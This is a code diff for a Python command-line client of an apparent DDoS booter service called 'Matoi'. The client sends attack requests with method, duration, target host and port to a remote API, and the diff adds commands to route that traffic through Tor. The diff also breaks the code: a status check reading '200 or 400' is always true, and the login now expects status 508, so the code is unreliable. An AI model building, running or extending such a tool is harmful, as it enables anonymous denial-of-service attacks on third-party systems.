@@ -105,7 +105,7 @@ login2 = Fore.YELLOW + """███╗   ███╗ █████╗ ██�
 
 
 def login(node, user=None, password=None):
-    tor = "on"
+    tor = "off"
 
     if os.path.exists('login.txt'):
         with open('login.txt', 'r') as file:
@@ -130,9 +130,9 @@ def login(node, user=None, password=None):
     api_url = f"https://api.failed.lol/matoi/start?node={node}&user={user}&password={password}"
     
     try:
-        response = tor_request(api_url)
+        response = requests.get(api_url)
         
-        if response.status_code == 200:
+        if response.status_code == 508:
             data = response.json()
             
             if "valid" in data and data["valid"]:
@@ -241,8 +241,8 @@ def main(user, password, tor):
             if tor == "off":
                 response = requests.get(f'https://api.failed.lol/matoi/start?node=node1&user={user}&password={password}&method={method}&time={time}&host={ip}&port={port}')
 
-                if response.status_code == 200:
-                    print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server! {response.status_code} {Fore.RESET}")
+                if response.status_code == 200 or 400:
+                    print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server! {Fore.RESET}")
                     main(user, password, tor)
                 else:
                     print(f"{Fore.LIGHTRED_EX}Failed to send the attack request. Server response: {response.status_code}{Fore.RESET}")
@@ -250,8 +250,8 @@ def main(user, password, tor):
             if tor == "on":
                 response = tor_request(f'https://api.failed.lol/matoi/start?node=node1&user={user}&password={password}&method={method}&time={time}&host={ip}&port={port}')
 
-                if response.status_code == 200:
-                    print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server! {response.status_code}{Fore.RESET}")
+                if response.status_code == 200 or 400:
+                    print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server!{Fore.RESET}")
                     main(user, password, tor)
                 else:
                     print(f"{Fore.LIGHTRED_EX}Failed to send the attack request, Server response: {response.status_code}{Fore.RESET}")
@@ -288,9 +288,52 @@ def main(user, password, tor):
             if response.status_code == 200:
                 data = response.json()
                 print(data["ip_address"])
+
+    if command.startswith("tor"):
+        parts = command.split()
+
+        if len(parts) != 2:
+            print(f"{Fore.RED}! Invalid command format. Expected: tor <on/off>{Fore.RESET}")
+            main(user, password, tor)
+        else:
+            tor, status = parts
+            if status == "on":
+                tor = "on"
+                print(f"[LOG] {Fore.GREEN}Tor has been succesfuly started and connected to! {Fore.RESET}")
+                main(user, password, tor)
+            if status == "off":
+                tor = "off"
+                print(f"[LOG] {Fore.RED}Tor has been stopped and disconnected from! {Fore.RESET}")
+                main(user, password, tor)
+    if command.startswith("test"):
+        parts = command.split()
+
+        if len(parts) != 2:
+            print(f"{Fore.RED}! Invalid command format. Expected: test <connection type>{Fore.RESET}")
+            main(user, password, tor)
+        else:
+            test, connection = parts
+            if connection == "tor":
+                url = "http://check.torproject.org"
+                response = tor_request(url)
+                if response:
+                    if tor == "on": 
+                        print(f"[TEST-LOG] {Fore.GREEN} TOR IS WORKING! {Fore.RESET}")
+                        main(user, password, tor)
+                    else:
+                        print(f"[TEST-LOG] {Fore.RED}TOR IS NOT WORKING!{Fore.RESET}")
+                        main(user, password, tor)
+                else:
+                    print(f"[TEST-LOG] {Fore.RED}TOR IS NOT WORKING!{Fore.RESET}")
+                    main(user, password, tor)
+            else:
+                print(f"{Fore.RED}! Unknow connection, List of connections: tor{Fore.RESET}")
+                main(user, password, tor)
+
     else:
         print("Unknow command")
         main(user, password, tor)
     
+print(f"[MATOI-LOG] {Fore.GREEN}Pre-Starting tor client! This may take a while.")
 tor_process = start_tor()
 login("node1")
